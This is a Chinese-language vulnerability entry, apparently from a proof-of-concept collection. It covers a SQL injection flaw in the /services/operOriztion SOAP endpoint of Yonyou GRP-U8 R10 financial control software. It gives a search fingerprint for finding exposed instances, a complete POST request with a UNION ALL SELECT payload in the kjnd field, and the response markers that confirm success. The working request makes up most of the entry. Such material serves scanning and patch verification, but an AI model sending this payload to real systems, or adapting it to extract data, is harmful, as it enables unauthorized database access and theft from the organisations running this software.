﻿# 用友GRP-U8 operOriztion SQL注入漏洞

> 更新时间：2024-04-19

> 漏洞编号：

> 漏洞说明：用友GRP-U8R10行政事业内控管理软件/services/operOriztion存在SQL注入漏洞，该漏洞使得攻击者可以通过构造精心设计的恶意SQL语句，成功执行未经授权的数据库操作。此漏洞可能导致敏感信息泄露、数据库被篡改或其他安全风险。

> 漏洞特征：app="用友-GRP-U8"

> 验证脚本：HTTP

```
POST /services/operOriztion HTTP/1.1
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsdd="http://xml.apache.org/axis/wsdd/">
<soapenv:Header/>
<soapenv:Body>
<wsdd:getGsbmfaByKjnd soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<kjnd xsi:type="xsd:string">' UNION ALL SELECT sys.fn_sqlvarbasetostr(HashBytes('MD5','123456'))-- </kjnd>
</wsdd:getGsbmfaByKjnd>
</soapenv:Body>
</soapenv:Envelope>


```

> 响应代码特征：200

> 响应内容特征：49ba59abbe56e057

> 上传文件定位：

> 验证文件来源：用友GRP-U8 operOriztion SQL注入漏洞.poc

